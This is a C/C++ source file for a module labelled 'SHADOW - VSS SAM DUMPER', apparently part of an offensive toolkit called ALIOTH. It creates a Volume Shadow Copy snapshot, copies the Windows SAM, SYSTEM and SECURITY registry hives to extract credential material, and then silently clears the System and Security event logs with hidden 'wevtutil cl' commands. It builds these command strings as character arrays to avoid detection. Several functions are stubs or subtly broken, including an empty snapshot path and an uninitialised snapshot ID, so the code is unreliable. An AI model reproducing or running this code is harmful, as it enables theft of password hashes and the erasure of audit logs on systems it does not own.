#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

typedef struct _VSS_CONTEXT {
    IVssBackupComponents* pVssComponents;
    BOOL bInitialized;
} VSS_CONTEXT;

VSS_CONTEXT g_VssCtx = {0};

BOOL ShadowInitVss() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return FALSE;
    
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                              RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }
    
    hr = CreateVssBackupComponents(&g_VssCtx.pVssComponents);
    if (FAILED(hr)) { CoUninitialize(); return FALSE; }
    
    hr = g_VssCtx.pVssComponents->InitializeForBackup(NULL);
    if (FAILED(hr)) { g_VssCtx.pVssComponents->Release(); CoUninitialize(); return FALSE; }
    
    hr = g_VssCtx.pVssComponents->SetContext(VSS_CTX_BACKUP | VSS_CTX_CLIENT_ACCESSIBLE);
    if (FAILED(hr)) { g_VssCtx.pVssComponents->Release(); CoUninitialize(); return FALSE; }
    
    g_VssCtx.bInitialized = TRUE;
    return TRUE;
}

VOID ShadowCleanupVss() {
    if (g_VssCtx.pVssComponents) {
        g_VssCtx.pVssComponents->Release();
        g_VssCtx.pVssComponents = NULL;
    }
    CoUninitialize();
    g_VssCtx.bInitialized = FALSE;
}

BOOL ShadowCreateSnapshot() {
    if (!g_VssCtx.bInitialized) return FALSE;
    
    VSS_ID snapshotId;
    HRESULT hr = g_VssCtx.pVssComponents->StartSnapshotSet(&snapshotId);
    if (FAILED(hr)) return FALSE;
    
    VSS_ID volumeSnapshotId;
    hr = g_VssCtx.pVssComponents->AddToSnapshotSet(L"C:\\", GUID_NULL, &volumeSnapshotId);
    if (FAILED(hr)) { g_VssCtx.pVssComponents->DeleteSnapshots(snapshotId, VSS_OBJECT_SNAPSHOT_SET, TRUE, NULL); return FALSE; }
    
    hr = g_VssCtx.pVssComponents->DoSnapshotSet(&snapshotId);
    if (FAILED(hr)) { g_VssCtx.pVssComponents->DeleteSnapshots(snapshotId, VSS_OBJECT_SNAPSHOT_SET, TRUE, NULL); return FALSE; }
    
    return TRUE;
}

BOOL ShadowCopyHiveFromSnapshot(PCHAR pcHivePath, PCHAR pcOutputPath) {
    CHAR szSnapshotPath[MAX_PATH] = {0};
    
    CHAR szSrc[MAX_PATH];
    snprintf(szSrc, MAX_PATH, "%s\\Windows\\System32\\config\\%s", szSnapshotPath, pcHivePath);
    
    return CopyFileA(szSrc, pcOutputPath, FALSE);
}

BOOL ShadowRawDiskRead(PCHAR pcOutputPath) {
    CHAR sDevice[] = {'\\','\\','.','\\','C',':',0};
    HANDLE hDevice = CreateFileA(sDevice, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) return FALSE;
    
    CloseHandle(hDevice);
    return FALSE;
}

BOOL ShadowParseHive(PCHAR pcHivePath, PVOID* ppOutput, PDWORD pdwSize) {
    HANDLE hFile = CreateFileA(pcHivePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD dwSize = GetFileSize(hFile, NULL);
    PBYTE pHive = (PBYTE)LocalAlloc(LPTR, dwSize);
    DWORD dwRead = 0;
    ReadFile(hFile, pHive, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    
    if (dwRead != dwSize) { LocalFree(pHive); return FALSE; }
    
    *ppOutput = pHive;
    *pdwSize = dwSize;
    return TRUE;
}

BOOL ShadowDiffDump(PCHAR pcOutputPath) {
    return TRUE;
}

BOOL ShadowEtwLogClean() {
    CHAR sCmd1[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','y','s','t','e','m',0};
    CHAR sCmd2[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','e','c','u','r','i','t','y',0};
    
    WinExec(sCmd1, SW_HIDE);
    WinExec(sCmd2, SW_HIDE);
    return TRUE;
}

BOOL ShadowDeleteSnapshot() {
    if (!g_VssCtx.bInitialized || !g_VssCtx.pVssComponents) return FALSE;
    
    VSS_ID snapshotSetId;
    HRESULT hr = g_VssCtx.pVssComponents->DeleteSnapshots(snapshotSetId, VSS_OBJECT_SNAPSHOT_SET, TRUE, NULL);
    return SUCCEEDED(hr);
}

DWORD ShadowMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','S','H','A','D','O','W',' ','-',' ','V','S','S',' ','S','A','M',' ','D','U','M','P','E','R',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    if (!ShadowInitVss()) {
        printf("[!] VSS init failed\n");
        return 1;
    }
    
    if (pParams->shadow.bUseDirectRead) {
        printf("[*] Using raw disk read...\n");
        ShadowRawDiskRead(pParams->shadow.pcOutputPath);
    } else {
        printf("[*] Creating VSS snapshot...\n");
        if (!ShadowCreateSnapshot()) {
            printf("[!] Snapshot creation failed\n");
            ShadowCleanupVss();
            return 1;
        }
        
        CHAR szSamPath[MAX_PATH], szSystemPath[MAX_PATH], szSecurityPath[MAX_PATH];
        snprintf(szSamPath, MAX_PATH, "%s\\SAM", pParams->shadow.pcOutputPath ? pParams->shadow.pcOutputPath : ".");
        snprintf(szSystemPath, MAX_PATH, "%s\\SYSTEM", pParams->shadow.pcOutputPath ? pParams->shadow.pcOutputPath : ".");
        snprintf(szSecurityPath, MAX_PATH, "%s\\SECURITY", pParams->shadow.pcOutputPath ? pParams->shadow.pcOutputPath : ".");
        
        printf("[*] Copying SAM...\n");
        ShadowCopyHiveFromSnapshot("SAM", szSamPath);
        printf("[*] Copying SYSTEM...\n");
        ShadowCopyHiveFromSnapshot("SYSTEM", szSystemPath);
        printf("[*] Copying SECURITY...\n");
        ShadowCopyHiveFromSnapshot("SECURITY", szSecurityPath);
        
        if (pParams->shadow.bDeleteAfterRead) {
            printf("[*] Deleting snapshot...\n");
            ShadowDeleteSnapshot();
        }
        
        PVOID pParsed = NULL; DWORD dwParsedSize = 0;
        ShadowParseHive(szSamPath, &pParsed, &dwParsedSize);
        if (pParsed) LocalFree(pParsed);
    }
    
    if (pParams->shadow.bDifferential) {
        ShadowDiffDump(pParams->shadow.pcOutputPath);
    }
    
    ShadowEtwLogClean();
    ShadowCleanupVss();
    return 0;
}
#pragma optimize("", on)
